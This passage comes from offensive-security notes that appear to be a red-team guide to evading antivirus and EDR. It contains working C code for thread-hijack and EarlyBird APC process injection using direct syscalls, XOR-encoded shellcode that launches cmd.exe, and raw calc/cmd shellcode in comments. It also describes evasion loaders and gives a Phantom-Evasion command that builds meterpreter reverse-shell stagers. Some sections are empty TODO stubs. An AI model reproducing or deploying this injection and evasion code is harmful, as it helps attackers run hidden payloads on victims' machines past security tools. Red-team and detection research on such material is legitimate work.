                ClientId.UniqueProcess = (PVOID)tpid;
                ClientId.UniqueThread = (PVOID)threadEntry.th32ThreadID;
                NTSTATUS OpenThreadStatus = NtOpenThread(&threadHandle, THREAD_ALL_ACCESS, &ObjectAttributes, &ClientId);

                if (OpenThreadStatus == 0 && threadHandle) {
                        break;
                }
#ifdef _DEBUG
                else {
                    printf("Opening of target process thread with NtOpenThread failed: %x\n", OpenThreadStatus);
                    return -1;
                }
#endif
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    /* Standard API (no error check). */
    //SuspendThread(threadHandle);
    //GetThreadContext(threadHandle, &context);
    //context.Rip = (DWORD_PTR) shellcodeBaseAddress;
    //SetThreadContext(threadHandle, &context);

    //ResumeThread(threadHandle);

    /* Direct syscall with Syswhisper2 to avoid userland hooks. */

    NTSTATUS SuspendThreadStatus = NtSuspendThread(threadHandle, NULL);
    if (SuspendThreadStatus != 0) {
#ifdef _DEBUG
        printf("Suspending of target thread with NtSuspendThread failed: %x\n", SuspendThreadStatus);
#endif
        return 1;
    }


    NTSTATUS GetContextThreadStatus = NtGetContextThread(threadHandle, &context);
    if (GetContextThreadStatus != 0) {
#ifdef _DEBUG
        printf("Getting context of remote thread with NtGetContextThread failed: %x\n", GetContextThreadStatus);
#endif
        return 1;
    }

    context.Rip = (DWORD_PTR) shellcodeBaseAddress;

    NTSTATUS SetContextThreadStatus = NtSetContextThread(threadHandle, &context);
    if (SetContextThreadStatus != 0) {
#ifdef _DEBUG
        printf("Setting context of remote thread with NtSetContextThread failed: %x\n", SetContextThreadStatus);
#endif
        return 1;
    }

    NTSTATUS NtResumeThreadStatus = NtResumeThread(threadHandle, NULL);
    if (NtResumeThreadStatus != 0) {
#ifdef _DEBUG
        printf("Resuming hijacked thread with NtResumeThread failed: %x\n", NtResumeThreadStatus);
#endif
        return 1;
    }

    return 0;
}
```

*EarlyBird injection - new process*

```
python .\syswhispers.py -a x64 -o EarlyBird --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtOpenProcess,NtResumeThread,NtQueueApcThread
```

```
int main() {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* Calc.exe */
	//unsigned char shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
	//"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
	//"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
	//"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
	//"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
	//"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
	//"\x48\x83\xec\x20\x41\xff\xd6";

	/* cmd.exe */
	//unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
	//"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
	//"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
	//"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
	//"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
	//"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
	//"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
	//"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
	//"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
	//"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
	//"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
	//"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
	//"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
	//"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
	//"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
	//"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
	//"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
	//"\x2e\x65\x78\x65\x00";

	/* XOR encoded CMD (0xda) */
	unsigned char shellcode[] = { '\x26','\x92','\x59','\x3e','\x2a','\x32','\x1a','\xda','\xda','\xda','\x9b','\x8b','\x9b','\x8a','\x88','\x8b','\x8c','\x92','\xeb','\x08','\xbf','\x92','\x51','\x88','\xba','\x92','\x51','\x88','\xc2','\x92','\x51','\x88','\xfa','\x92','\x51','\xa8','\x8a','\x92','\xd5','\x6d','\x90','\x90','\x97','\xeb','\x13','\x92','\xeb','\x1a','\x76','\xe6','\xbb','\xa6','\xd8','\xf6','\xfa','\x9b','\x1b','\x13','\xd7','\x9b','\xdb','\x1b','\x38','\x37','\x88','\x9b','\x8b','\x92','\x51','\x88','\xfa','\x51','\x98','\xe6','\x92','\xdb','\x0a','\x51','\x5a','\x52','\xda','\xda','\xda','\x92','\x5f','\x1a','\xae','\xbd','\x92','\xdb','\x0a','\x8a','\x51','\x92','\xc2','\x9e','\x51','\x9a','\xfa','\x93','\xdb','\x0a','\x39','\x8c','\x92','\x25','\x13','\x9b','\x51','\xee','\x52','\x92','\xdb','\x0c','\x97','\xeb','\x13','\x92','\xeb','\x1a','\x76','\x9b','\x1b','\x13','\xd7','\x9b','\xdb','\x1b','\xe2','\x3a','\xaf','\x2b','\x96','\xd9','\x96','\xfe','\xd2','\x9f','\xe3','\x0b','\xaf','\x02','\x82','\x9e','\x51','\x9a','\xfe','\x93','\xdb','\x0a','\xbc','\x9b','\x51','\xd6','\x92','\x9e','\x51','\x9a','\xc6','\x93','\xdb','\x0a','\x9b','\x51','\xde','\x52','\x92','\xdb','\x0a','\x9b','\x82','\x9b','\x82','\x84','\x83','\x80','\x9b','\x82','\x9b','\x83','\x9b','\x80','\x92','\x59','\x36','\xfa','\x9b','\x88','\x25','\x3a','\x82','\x9b','\x83','\x80','\x92','\x51','\xc8','\x33','\x8d','\x25','\x25','\x25','\x87','\x92','\x60','\xdb','\xda','\xda','\xda','\xda','\xda','\xda','\xda','\x92','\x57','\x57','\xdb','\xdb','\xda','\xda','\x9b','\x60','\xeb','\x51','\xb5','\x5d','\x25','\x0f','\x61','\x2a','\x6f','\x78','\x8c','\x9b','\x60','\x7c','\x4f','\x67','\x47','\x25','\x0f','\x92','\x59','\x1e','\xf2','\xe6','\xdc','\xa6','\xd0','\x5a','\x21','\x3a','\xaf','\xdf','\x61','\x9d','\xc9','\xa8','\xb5','\xb0','\xda','\x83','\x9b','\x53','\x00','\x25','\x0f','\xb9','\xb7','\xbe','\xf4','\xbf','\xa2','\xbf','\xda' };

	int szShellcode = sizeof(shellcode);
	VOID CALLBACK APCProc();

	if (!CreateProcessA((LPCSTR)"C:\\Windows\\System32\\calc.exe", (LPSTR)NULL, (LPSECURITY_ATTRIBUTES)NULL, (LPSECURITY_ATTRIBUTES)NULL, (BOOL)FALSE, (DWORD)CREATE_SUSPENDED, (LPVOID)NULL, (LPCSTR)NULL, (LPSTARTUPINFOA)&si, (LPPROCESS_INFORMATION)&pi)) {
#ifdef _DEBUG
        printf("CreateProcessA failed: %x\n", GetLastError());
#endif
        return -1;
	}

	LPVOID shellcodeBaseAddress = VirtualAllocEx(pi.hProcess, NULL, szShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeBaseAddress == NULL) {
#ifdef _DEBUG
            printf("VirtualAllocEx failed: %x\n", GetLastError());
#endif
			return -1;
	}

    /* Standard API */
//    if (!WriteProcessMemory(pi.hProcess, shellcodeBaseAddress, shellcode, szShellcode, NULL)) {
//#ifdef _DEBUG
//        printf("WriteProcessMemory failed: %x\n", GetLastError());
//#endif
//		return -1;
//	}

    /* Standard API - xorred shellcode */
//    for (int i = 0; i < szShellcode; i++) {
//        char DecodedOpCode = shellcode[i] ^ 0xda;
//
//        BOOL WriteProcessMemoryStatus = WriteProcessMemory(pi.hProcess, ((char*)shellcodeBaseAddress) + i, &DecodedOpCode, sizeof(char), NULL);
//        if (!WriteProcessMemoryStatus) {
//#ifdef _DEBUG
//            printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", GetLastError());
//#endif
//            return 1;
//        }
//    }

    /* Direct syscalls - xorred shellcode */
    for (int i = 0; i < szShellcode; i++) {
	    char DecodedOpCode = shellcode[i] ^ 0xda;

		NTSTATUS WriteProcessMemoryStatus = NtWriteVirtualMemory(pi.hProcess, ((char*)shellcodeBaseAddress) + i, &DecodedOpCode, sizeof(char), NULL);
		if (WriteProcessMemoryStatus != 0) {
#ifdef _DEBUG
		    printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", WriteProcessMemoryStatus);
#endif
			return 1;
		}
	}

    DWORD OldProtectt = 0;
    BOOL virtualProctectExStatus = VirtualProtectEx(pi.hProcess, shellcodeBaseAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtectt);
#ifdef _DEBUG
    if (!virtualProctectExStatus) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", GetLastError());
        return 1;
    }
#endif

    /* Standard API - sometimes buggy */
//    PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)shellcodeBaseAddress;
//	if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL)) {
//#ifdef _DEBUG
//        printf("Queing the APC thread failed with: %x\n", GetLastError());
//#endif
//		return -1;
//	}

    /* Direct syscall */
    NTSTATUS NtQueueApcThreadStatus = NtQueueApcThread(pi.hThread, (PKNORMAL_ROUTINE)shellcodeBaseAddress, 0, 0, 0);
    if (NtQueueApcThreadStatus != 0) {
#ifdef _DEBUG
        printf("Queing the APC thread failed with: %x\n", NtQueueApcThreadStatus);
#endif
        return 1;
    }

    Sleep(100);

	ResumeThread(pi.hThread);

	return 0;
}
```

###### DripLoader

[`DripLoader`](https://github.com/xinbailu/DripLoader) is a shellcode loader
that attempt to evade security products by:
  - Making direct `NtAllocateVirtualMemory` and `NtCreateThreadEx` syscalls
    (using an header and ASM files containing the syscalls' assembly
    instructions).

  - blending in legitimate memory allocations by only allocating
    `PageSizesized` (4kB by default) pages to place the shellcode in memory.

  - adding a delay between memory allocations to avoid multi-event correlation.

[`DripLoader-EmbedAES`](XXX) can be used to pack an `AES`-encrypted and
`base64`-encoded shellcode as resource file directly in a `DripLoader` binary.
If the `AES` key specified is partial, the missing bytes will be bruteforced.
This artificially added complexity may help evade security product's emulation
/ sandboxes based detections.

###### Donut

[`donut`](https://github.com/TheWover/donut)

TODO

###### ScareCrow

[`ScareCrow`](https://github.com/optiv/ScareCrow)

TODO

###### PEzor

[`PEzor`](https://github.com/phra/PEzor)

TODO

###### Phantom-Evasion (outdated)

`Phantom-Evasion 3.0` is a framework written in `Python` that can generate
both `x86` or `x64` executables and `DLL` / `Reflective DLL`.

`Phantom-Evasion 3.0` supports a number of Anti-virus evasion techniques,
execution and injection methods (thread, asynchronous procedure call, thread
execution hijack, etc.) with various memory allocation techniques, as well as
shellcode encryption.

Additionally, out of scope of the present note, `Phantom-Evasion 3.0` can be
used to generate Linux shellcode, backdoored Android APK, and offers various
Windows privileges escalation and persistence modules.

```bash
# With out any arguments, Phantom-Evasion is started in interactive mode
python3 phantom-evasion.py

-- General options
# -S, --strip / Strip executable
# -c <CERTSIGN>, --certsign <CERTSIGN> / Certificate spoofer and exe signer
# -cd <CERTDESCR>, --certdescr <CERTDESCR> /  Certificate description
# -E <EVASIONFREQUENCY>, --evasionfrequency EVASIONFREQUENCY /  Windows evasion code frequency (default:10)
# -J <JUNKFREQUENCY>, --junkfrequency <JUNKFREQUENCY> / Junkcode frequency (default:10)
# -j <JUNKINTENSITY>, --junkintensity <JUNKINTENSITY> / Junkcode intensity (default:10)
# -jr <JUNKREINJECT>, --junkreinject <JUNKREINJECT> / Junkcode reinjection intensity (default:10)
# -un, --unhook / Add Ntdll unhook routine
# -msq <MASQPATH>, --masqpath <MASQPATH> / Fake Process path for masquerading (default: C:\windows\system32\notepad.exe)
# -msqc <MASQCMD>, --masqcmd <MASQCMD> / Fake Fullcmdline for masquerading (default: empty)

-- Windows meterpreter stager
# MODULES:
#   windows/meterpreter/reverse_TCP = WRT
#   windows/meterpreter/reverse_http = WRH
#   windows/meterpreter/reverse_https = WRS

python3 phantom-evasion.py -a <x86 | x64> -m <WRT | WRH | WRS> -H <LISTENING_IP> -P <LISTENING_PORT> -f <exe | dll> -o <OUTPUT_FILENAME>
```

### Loaded Shellcode in-memory protection

###### In memory shellcode's contents encryption and memory protection switch (RW / NoAccess <-> RX)

*`Cobalt Strike`'s `sleepmask` kit.*

Refer to the `[Cobalt Strike] Beacons generation` note for more information on
possibilities natively offered by `Cobalt Strike` for in-memory obfuscation of
`beacons` shellcode.

*ShellcodeFluctuation.*

[`ShellcodeFluctuation`](https://github.com/mgeeky/ShellcodeFluctuation)

TODO

###### ThreadStackSpoofer

[`ThreadStackSpoofer`](https://github.com/mgeeky/ThreadStackSpoofer)

TODO

--------------------------------------------------------------------------------

### References

https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection
